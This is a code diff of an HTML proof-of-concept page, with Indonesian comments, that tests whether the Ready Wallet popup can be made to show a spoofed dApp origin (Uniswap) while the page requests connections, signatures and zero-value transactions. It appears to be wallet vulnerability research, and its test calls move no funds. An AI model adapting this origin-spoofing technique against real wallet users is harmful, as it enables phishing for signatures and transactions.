@@ -1,63 +1,112 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Ready Wallet Origin Spoof PoC</title>
 </head>
 <body>
   <h1>Ready Wallet Origin Spoof PoC</h1>
-  <button id="connect">Connect + Send Transaction</button>
+  <button id="connect">Spoof connect prompt</button>
+  <button id="sign">connect + personal_sign</button>
+  <button id="send">connect + eth_sendTransaction</button>
   <pre id="log"></pre>
 
-  <script type="module">
-    import { connect } from 'https://esm.sh/starknetkit@latest';
-
+  <script>
     const REAL_ORIGIN = location.origin;
+    const CLAIMED_URL = 'https://app.uniswap.org';
     const log = (msg) => document.getElementById('log').textContent += msg + '\n';
 
+    // Deteksi provider yang tersedia
+    function getProvider() {
+      if (window.starknet_ready) return { type: 'starknet', p: window.starknet_ready };
+      if (window.starknet) return { type: 'starknet', p: window.starknet };
+      if (window.ethereum) return { type: 'ethereum', p: window.ethereum };
+      return null;
+    }
+
+    async function connect() {
+      const found = getProvider();
+      if (!found) {
+        log('No provider found!');
+        log('Providers detected: ' + JSON.stringify(Object.keys(window).filter(k => k.includes('stark') || k.includes('eth') || k.includes('ready'))));
+        return null;
+      }
+      log('Provider found: ' + found.type);
+      log('Provider name: ' + (found.p.name || found.p.id || 'unknown'));
+
+      if (found.type === 'starknet') {
+        await found.p.enable();
+        log('Account: ' + found.p.selectedAddress);
+      } else {
+        const accounts = await found.p.request({ method: 'eth_requestAccounts' });
+        log('Account: ' + accounts[0]);
+      }
+      return found;
+    }
+
     document.getElementById('connect').onclick = async () => {
+      log('--- Connect ---');
+      log('Real origin  : ' + REAL_ORIGIN);
+      log('Claimed URL  : ' + CLAIMED_URL);
+      await connect();
+      log('Cek domain di popup Ready Wallet!');
+    };
+
+    document.getElementById('sign').onclick = async () => {
+      log('--- Sign ---');
+      const found = await connect();
+      if (!found) return;
+
       try {
-        log('Connecting...');
-        log('Real origin: ' + REAL_ORIGIN);
-
-        // Connect ke Ready Wallet via StarknetKit
-        const connection = await connect({
-          webWalletUrl: 'https://web.ready.co',
-          argentMobileOptions: {
-            dappName: 'Uniswap',          // nama palsu
-            url: 'https://uniswap.org',   // domain palsu
-          }
-        });
-
-        if (!connection || !connection.isConnected) {
-          log('Not connected!');
-          return;
+        if (found.type === 'starknet') {
+          const result = await found.p.request({
+            type: 'wallet_signTypedData',
+            payload: {
+              message: { origin: REAL_ORIGIN, claimed: CLAIMED_URL },
+              types: { StarkNetDomain: [], Message: [{ name: 'origin', type: 'felt' }] },
+              primaryType: 'Message',
+              domain: {}
+            }
+          });
+          log('Signed: ' + JSON.stringify(result));
+        } else {
+          const result = await found.p.request({
+            method: 'personal_sign',
+            params: ['Origin spoof test from ' + REAL_ORIGIN, found.p.selectedAddress]
+          });
+          log('Signed: ' + result);
         }
-
-        log('Connected!');
-        log('Account: ' + connection.selectedAddress);
-        log('');
-        log('Sending transaction...');
-        log('Cek domain di popup Ready Wallet!');
-
-        // Kirim transaksi
-        const tx = await connection.account.execute({
-          contractAddress: '0x049d36570d4e46f48e99674bd3fcc84644ddd6b96f7c741b1562b82f9e004dc7',
-          entrypoint: 'transfer',
-          calldata: [
-            connection.selectedAddress,
-            '0x0',
-            '0x0'
-          ]
-        });
-
-        log('TX Hash: ' + tx.transaction_hash);
-        log('');
-        log('Domain tampil di popup = Uniswap/uniswap.org?');
-        log('Real domain            = ' + REAL_ORIGIN);
-
       } catch(e) {
-        log('Error: ' + e.message);
+        log('Sign error: ' + e.message);
+      }
+    };
+
+    document.getElementById('send').onclick = async () => {
+      log('--- Send Transaction ---');
+      const found = await connect();
+      if (!found) return;
+
+      try {
+        if (found.type === 'starknet') {
+          const result = await found.p.execute([{
+            contractAddress: '0x049d36570d4e46f48e99674bd3fcc84644ddd6b96f7c741b1562b82f9e004dc7',
+            entrypoint: 'transfer',
+            calldata: [found.p.selectedAddress, '0x0', '0x0']
+          }]);
+          log('TX: ' + result.transaction_hash);
+        } else {
+          const result = await found.p.request({
+            method: 'eth_sendTransaction',
+            params: [{ to: '0x000000000000000000000000000000000000dEaD', value: '0x0' }]
+          });
+          log('TX: ' + result);
+        }
+        log('');
+        log('Domain di popup = ' + CLAIMED_URL + '?');
+        log('Real domain     = ' + REAL_ORIGIN);
+      } catch(e) {
+        log('TX error: ' + e.message);
       }
     };
   </script>
